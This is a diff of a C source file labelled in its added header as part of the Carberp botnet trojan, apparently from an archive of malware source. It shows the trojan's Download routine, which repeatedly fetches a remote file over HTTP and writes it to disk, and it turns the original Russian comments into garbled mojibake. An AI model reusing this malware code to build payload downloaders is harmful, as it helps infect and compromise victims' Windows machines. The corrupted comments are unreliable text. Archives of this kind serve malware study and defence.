@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include"PackageLoad.h"
 
 #define STEP	1024*100
@@ -23,7 +34,7 @@ void Download(char*URL,WCHAR*FileName)
 	{
 		DWORD dwSizeHigh=0, dwSizeLow=0;
 		dwSizeLow = (DWORD)pGetFileSize(hFile, &dwSizeHigh);
-		nFileLen = ((LONGLONG)dwSizeHigh * (LONGLONG)(4294967295+1)) + (LONGLONG)dwSizeLow;// на случай очень большого файла
+		nFileLen = ((LONGLONG)dwSizeHigh * (LONGLONG)(4294967295+1)) + (LONGLONG)dwSizeLow;// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		while (true)
 		{
 			PHTTPRequest R = HTTPCreateRequest(URL);
@@ -51,7 +62,7 @@ void Download(char*URL,WCHAR*FileName)
 				pSleep(1000*60);
 				continue;
 			}
-			if (0==Response.FullSize)//по запросу нету данных, скорее всего все закачано
+			if (0==Response.FullSize)//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{				
 				break;
 			}
@@ -61,7 +72,7 @@ void Download(char*URL,WCHAR*FileName)
 			nFileLen+=ButeWriten;
 			if (nFileLen==Response.FullSize)
 			{
-				//Получили данные, и они равны размеру файла, выходим
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				break;
 			}
 			STR::Free(Result);
